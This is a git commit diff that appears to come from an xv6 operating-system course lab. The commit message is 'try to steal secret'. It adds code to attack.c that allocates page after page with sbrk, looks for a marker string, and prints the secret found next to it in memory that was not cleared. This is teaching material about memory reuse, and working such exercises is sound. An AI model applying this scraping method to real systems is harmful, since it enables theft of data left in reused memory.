68407fe5f5b396020531f4a6fc35b9f6dedcff00
I514692 <klose.wu@sap.com>
2025-10-20 17:55:18 +0800

    try to steal secret

--- user/attack.c
+++ user/attack.c
@@ -7,6 +7,15 @@ int
 main(int argc, char *argv[])
 {
   // Your code here.
-
+  uint64 addr = 0x0000000000000010; 
+  while(1){
+    char *a = sbrk(PGSIZE);
+    if(a == SBRK_ERROR){
+      break;
+    }
+    if (strcmp("This may help.", a + addr) == 0) {
+      printf("%s\n", a + addr + 16);
+    } 
+  }
   exit(1);
 }
